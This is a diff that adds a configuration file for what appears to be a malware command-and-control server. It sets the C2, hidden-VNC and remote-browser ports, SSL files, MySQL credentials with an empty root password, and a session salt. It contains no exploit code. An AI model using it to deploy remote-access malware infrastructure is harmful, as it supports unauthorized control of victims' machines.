@@ -1,0 +1,23 @@
+#Recommended to use SSL with a real cert, Use the included LetsEncrypt setup or get one yourself
+#You must run everything on separate ports and they must be port forwarded so the internet can communicate with the C2
+
+[server]
+port = "8080" #C2 Port
+
+ssl = true #Use SSL
+cert = "server.crt" #SSL Cert File
+key = "server.key" #SSL Key File
+
+hvnc = "53899" #hVNC Port
+rbrowser = "5555" #Remote Browser Port
+
+[database]
+host = "127.0.0.1:3306" #MySQL Host and Port
+database = "whistesting" #MySQL Database Name
+username = "root" #MySQL Username
+password = "" #MySQL Password
+
+[settings]
+salt = "mKX1" #Account Management Salt
+session = "whis" #C2 Account Management Session
+
